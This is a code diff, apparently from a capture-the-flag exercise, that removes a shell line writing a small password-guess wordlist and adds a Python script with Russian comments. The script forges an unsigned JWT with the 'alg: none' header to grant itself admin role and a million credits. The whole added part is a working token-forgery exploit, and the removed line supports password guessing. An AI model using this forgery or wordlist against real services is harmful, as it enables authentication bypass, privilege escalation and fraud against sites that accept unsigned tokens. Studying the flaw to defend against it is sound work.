@@ -1,1 +1,33 @@
-echo -e "secret\ncupid\nvalentine\nvalentine2026\nlove\nheart\ntryheartme\nadmin\npassword\n123456\nvalenflag" > passlist.txt
+import base64
+import json
+import time
+
+# 1. ЗАГОЛОВОК (Говорим серверу: "Никакой защиты нет")
+header = {
+    "alg": "none",
+    "typ": "JWT"
+}
+
+# 2. ДАННЫЕ (Рисуем себе права админа и кучу денег)
+payload = {
+    "email": "asdasdawfqsfsd@asda.asdqwf",  # Твой email из скрина
+    "role": "admin",
+    "credits": 1000000,           # БОГАТСТВО!
+    "iat": int(time.time()),
+    "theme": "valentine"
+}
+
+# Функция для правильного кодирования (без padding "=")
+def b64url(data):
+    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).decode().rstrip("=")
+
+# 3. СБОРКА
+token_header = b64url(header)
+token_payload = b64url(payload)
+
+# Важно: Токен заканчивается точкой, но после неё пустота (нет подписи)
+final_token = f"{token_header}.{token_payload}."
+
+print("\n=== ТВОЙ НОВЫЙ ТОКЕН ===")
+print(final_token)
+print("========================\n")
